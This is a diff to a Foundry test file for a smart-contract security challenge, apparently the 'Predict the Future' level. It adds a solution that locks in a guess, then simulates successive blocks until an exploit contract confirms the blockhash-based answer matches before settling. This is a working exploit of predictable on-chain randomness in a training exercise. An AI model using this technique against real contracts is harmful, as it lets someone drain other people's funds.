@@ -22,6 +22,19 @@ contract PredictTheFutureTest is Test {
         vm.warp(93582192);
 
         // Put your solution here
+        uint8 guess = 0;
+        predictTheFuture.lockInGuess{value: 1 ether}(guess);
+        for(uint256 n = 1; n < 100; n++) {
+            vm.roll(104293 + n);
+            vm.warp(93582192 + n * 12);
+
+            bool canSettle = exploitContract.testSettle(guess);
+            console.log("Iteration %s: %s", n, canSettle);
+            if (canSettle) {
+                predictTheFuture.settle();
+                break;
+            }
+        }
 
         _checkSolved();
     }
